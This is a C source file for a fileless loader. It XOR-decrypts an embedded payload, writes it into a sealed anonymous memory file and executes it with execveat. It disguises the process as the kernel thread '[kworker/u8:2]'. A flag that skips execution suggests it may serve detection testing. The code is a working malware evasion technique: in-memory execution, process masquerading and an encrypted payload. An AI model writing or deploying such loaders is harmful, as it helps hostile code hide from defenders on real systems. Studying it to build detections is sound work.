#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "build/payload_bytes.h"

extern char **environ;

static ssize_t write_all(int fd, const uint8_t *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t n = write(fd, buf + total, len - total);
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        total += (size_t)n;
    }
    return (ssize_t)total;
}

int main(int argc, char *argv[]) {
    const char *memfd_name = "jit_cache";
    const char *fake_argv0 = "[kworker/u8:2]";
    int benign_only = 0;
    int passthrough_idx = 0;
    char *child_argv[16];

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--benign-memfd") == 0) {
            benign_only = 1;
        } else if (strcmp(argv[i], "--memfd-name") == 0 && i + 1 < argc) {
            memfd_name = argv[++i];
        } else if (strcmp(argv[i], "--argv0") == 0 && i + 1 < argc) {
            fake_argv0 = argv[++i];
        } else if (passthrough_idx < 14) {
            child_argv[++passthrough_idx] = argv[i];
        }
    }

    int fd = memfd_create(memfd_name, MFD_CLOEXEC | MFD_ALLOW_SEALING);
    if (fd < 0) {
        perror("memfd_create");
        return 1;
    }

    if (benign_only) {
        const char *msg = "shared audio buffer data";
        if (write_all(fd, (const uint8_t *)msg, strlen(msg)) < 0) {
            perror("write");
            close(fd);
            return 1;
        }
        printf("[loader] benign memfd created (pid=%d fd=%d), exiting without exec\n",
               getpid(), fd);
        close(fd);
        return 0;
    }

    uint8_t *decrypted = malloc(PAYLOAD_LEN);
    if (!decrypted) {
        perror("malloc");
        close(fd);
        return 1;
    }

    for (size_t i = 0; i < PAYLOAD_LEN; i++) {
        decrypted[i] = PAYLOAD_ENC[i] ^ PAYLOAD_XOR_KEY;
    }

    if (write_all(fd, decrypted, PAYLOAD_LEN) < 0) {
        perror("write");
        free(decrypted);
        close(fd);
        return 1;
    }
    free(decrypted);

    int seals = F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_SEAL;
    if (fcntl(fd, F_ADD_SEALS, seals) < 0) {
        perror("fcntl(F_ADD_SEALS)");
        close(fd);
        return 1;
    }

    child_argv[0] = (char *)fake_argv0;
    child_argv[passthrough_idx + 1] = NULL;

    printf("[loader] executing sealed memfd payload (pid=%d fd=%d size=%zu bytes)\n",
           getpid(), fd, PAYLOAD_LEN);
    fflush(stdout);

    if (syscall(SYS_execveat, fd, "", child_argv, environ, AT_EMPTY_PATH) < 0) {
        perror("execveat");
        close(fd);
        return 1;
    }

    return 0;
}
